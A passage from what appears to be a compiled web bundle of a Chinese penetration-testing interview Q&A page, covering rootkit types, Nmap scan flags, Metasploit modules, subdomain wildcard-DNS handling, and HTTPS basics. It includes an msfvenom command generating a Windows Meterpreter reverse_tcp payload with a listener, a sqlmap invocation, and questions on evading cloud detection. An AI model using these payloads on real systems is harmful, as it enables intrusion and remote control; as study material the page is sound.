operator">&amp;</span> <span class="token comment">#守护进程</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>Rootkit的种类有哪些，针对不同种类的Rootkit应该如何防护以及检测？</summary><p>固件Rootkit</p><p>虚拟化Rootkit</p><p>内核级Rootkit</p><p>库级Rootkit</p><p>应用级Rootkit</p><p>Rootkit通过加载特殊驱动，修改系统内核隐藏自身及指定文件、进程和网络链接等。</p><p>可以使用chkrootkit工具检测，定期检查MD5、更新软件、安装杀软等方式防护</p><p>对于找出的 Rootkit，最好的应对方法便是擦除并重新安装系统</p></details><h2 id="安全开发-工具" tabindex="-1"><a class="header-anchor" href="#安全开发-工具" aria-hidden="true">#</a> 安全开发&amp;工具</h2><details class="custom-container details"><summary>Nmap扫描方式有哪几种？怎么扫描快？</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token parameter variable">-sT</span>	<span class="token comment">#TCP全连接扫描</span>
<span class="token parameter variable">-sS</span>	<span class="token comment">#TCP SYN半连接扫描 ()</span>
<span class="token parameter variable">-sU</span>	<span class="token comment">#UDP</span>
<span class="token parameter variable">-sA</span>	<span class="token comment">#ACK</span>
<span class="token parameter variable">-sF</span>	<span class="token comment">#FIN</span>

<span class="token parameter variable">-T4</span>	<span class="token comment">#设置时序模板越高越快</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>MSF有哪些模块？</summary><table><thead><tr><th>辅 助 模 块 (Auxiliary，扫描器)</th><th>扫描主机系统，寻找可用漏洞；</th></tr></thead><tbody><tr><td>渗透攻击模块 (Exploits)</td><td>进行漏洞利用攻击；</td></tr><tr><td>攻击载荷模块 (Payloads)</td><td>生成攻击载荷（木马）；</td></tr><tr><td>后渗透攻击模块 (Post)</td><td>用于内网渗透的各种操作；</td></tr><tr><td>编 码 器 模 块 (Encoders)</td><td>选择编码技术，绕过杀软（或其他免杀方式）</td></tr></tbody></table><p>所有模块位置：**/usr/share/metasploit-framework/modules/</p></details><details class="custom-container details"><summary>MSF如何生成木马建立监听？</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>msf <span class="token operator">&gt;</span> use exploit/multi/handler
msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp
<span class="token builtin class-name">set</span> LHOST
<span class="token builtin class-name">set</span> LPORT
run

msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">8089</span> <span class="token parameter variable">-f</span> dll <span class="token operator">&gt;</span> shell.dll
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>SQLmap注入怎么用？</summary><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -r bp.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>子域名挖掘如何处理泛解析？</summary><h4 id="泛解析定义" tabindex="-1"><a class="header-anchor" href="#泛解析定义" aria-hidden="true">#</a> 泛解析定义</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>泛域名解析是一种特殊的域名解析方式，它使用通配符*形式，设置域名解析。
它可以将没有明确设置的子域名一律解析到一个IP地址上。
这样，即使用户输入错误的子域名，也可以访问到域名持有者指定的IP地址。
但是信息收集中，这会造成请求的所有子域名都能访问的假象，从而收集到一堆无效的子域名。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="onforall的处理方法" tabindex="-1"><a class="header-anchor" href="#onforall的处理方法" aria-hidden="true">#</a> Onforall的处理方法</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>）随机生成3个子域名做DNS解析
<span class="token number">2</span>）如果没有都解析成功证明不是泛解析，都解析成功的话做HTTP请求判断
<span class="token number">3</span>）HTTP访问都成功则不是泛解析，反之则计算两两响应页面的相似度
<span class="token number">4</span>）有一组相似判断为不是泛解析，都不相似就是泛解析
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="自己的实现" tabindex="-1"><a class="header-anchor" href="#自己的实现" aria-hidden="true">#</a> 自己的实现</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>）用一个绝对不存在的子域名去解析A记录，如有记录则存在泛解析
<span class="token number">2</span>）用不存在的子域名提取CNAME记录，作为泛解析对比标志
<span class="token number">3</span>）接下来的流程用Lookupcname解析剩余子域名，与泛解析标志做对比,如果不一样并且不为空则此子域名存在
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>Go编写的端口扫描器在Linux平台漏报原因？</summary><p>Golang的<code>net.DialTimeout</code>这个函数最终其实就是调用<code>linux socket</code></p><p>而linux中任何东西都是文件，同时linux默认允许同时打开的文件数是1024</p><p>协程数量大于1024就会导致socket链接建立失败，漏报大量端口</p><p>将open files数量设置大一点即可</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">ulimit</span> <span class="token parameter variable">-n</span> <span class="token number">10000</span>	<span class="token comment">#临时解决办法，当前终端生效</span>

<span class="token comment">#永久生效方法</span>
<span class="token builtin class-name">echo</span> <span class="token string">&quot;* soft nofile 65533&quot;</span> <span class="token operator">&gt;&gt;</span> /etc/security/limits.conf
<span class="token builtin class-name">echo</span> <span class="token string">&quot;* hard nofile 65533&quot;</span> <span class="token operator">&gt;&gt;</span> /etc/security/limits.conf
<span class="token builtin class-name">echo</span> session required /lib/security/pam_limits.so <span class="token operator">&gt;&gt;</span> /etc/pam.d/login
<span class="token comment">#重启系统</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>Ajax发送POST请求会发几个数据包？</summary><p>两个，一个OPTIONS预请求，一个发送数据的请求</p></details><details class="custom-container details"><summary>HTTPS连接建立过程？</summary><p>1、客户端发送支持的加密协议版本（TLS）</p><p>2、服务器从中筛选合适的加密协议版本</p><p>3、服务器端返回证书，证书中有公钥</p><p>4、客户端使用根证书验证证书合法性</p><p>5、客户端生成对称密钥，通过证书中的公钥加密，发送到服务端</p><p>6、服务端使用私钥解密，获取对称密钥，使用对称密钥加密数据</p><p>7、客户端解密数据，SSL加密通信建立，开始通信......</p></details><h2 id="云安全" tabindex="-1"><a class="header-anchor" href="#云安全" aria-hidden="true">#</a> 云安全</h2><p>云安全和常规的安全有何不同？</p><p>如何绕过云安全的检测Getshell?</p><p>尽量不留痕迹的做渗透？</p><p>如何在不让云平台告警的情况下获取数据？</p>`,113);function _(O,C){const e=o("ExternalLinkIcon");return l(),i("div",null,[d,s("details",c,[u,m,h,k,s("p",null,[s("a",b,[a("https://www.ruanyifeng.com/blog/2016/04/cors.html"),t(e)])])]),v,s("p",null,[s("a",y,[a("https://xz.aliyun.com/t/7911"),t(e)])]),g,s("details",S,[x,s("p",null,[a('1）空间搜索引擎（title="xxx"、cert="'),s("a",f,[a("xxx.com"),t(e)]),a('"、icon_hash="xxx"）')]),w,T]),P])}const I=p(r,[["render",_],["__file","mj.html.vue"]]);export{I as default};
